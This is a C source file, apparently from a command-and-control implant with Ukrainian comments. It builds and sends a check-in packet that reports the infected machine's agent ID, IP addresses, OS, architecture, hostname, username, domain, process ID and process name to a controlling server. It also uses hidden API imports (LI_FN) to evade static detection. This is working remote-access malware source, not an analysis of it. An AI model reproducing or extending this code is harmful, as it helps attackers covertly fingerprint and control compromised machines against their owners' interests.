#include "Checkin.h"
#include "Package.h"
#include "Transport.h"
#include "Utils.h"
#include "config.h"
#include "kort.h"

PParser doCheckin(void) {
    if (!kortConfig) return NULL;

    // 0xF1 — ID команди check-in (має збігатися з Python-транслятором)
    PPackage pkg = newPackage(0xF1, TRUE);
    if (!pkg) return NULL;

    // 1) UUID без довжини (36 байт ASCII)
    addString(pkg, kortConfig->agentID, FALSE);

    // 2) IP-адреси
    UINT32 numIPs = 0;
    DWORD* ips = getIPAddress(&numIPs);
    addInt32(pkg, numIPs);
    if (ips) {
        for (UINT32 i = 0; i < numIPs; i++) addInt32(pkg, ips[i]);
        LI_FN(LocalFree)(ips);
    }

    // 3) OS (з довжиною)
    PCHAR os = getOsName();
    addString(pkg, os ? os : (PCHAR)"Windows", TRUE);
    if (os) LI_FN(LocalFree)(os);

    // 4) Arch (1 байт)
    addByte(pkg, getArch());

    // 5) Hostname
    PCHAR host = getHostname();
    addString(pkg, host ? host : (PCHAR)"host", TRUE);
    if (host) LI_FN(LocalFree)(host);

    // 6) Username
    PCHAR user = getUserName();
    addString(pkg, user ? user : (PCHAR)"user", TRUE);
    if (user) LI_FN(LocalFree)(user);

    // 7) Domain (wide string)
    PWCHAR dom = getDomain();
    addWString(pkg, dom ? dom : (PWCHAR)L"WORKGROUP", TRUE);
    if (dom) LI_FN(LocalFree)(dom);

    // 8) PID
    addInt32(pkg, LI_FN(GetCurrentProcessId)());

    // 9) Process name
    PCHAR proc = getCurrentProcName();
    addString(pkg, proc ? proc : (PCHAR)"unknown", TRUE);
    if (proc) LI_FN(LocalFree)(proc);

    // 10) External IP — поки що заглушка
    addString(pkg, (PCHAR)"1.1.1.1", TRUE);

    // Відправка
    PParser resp = sendPackage(pkg);
    freePackage(pkg);
    return resp;
}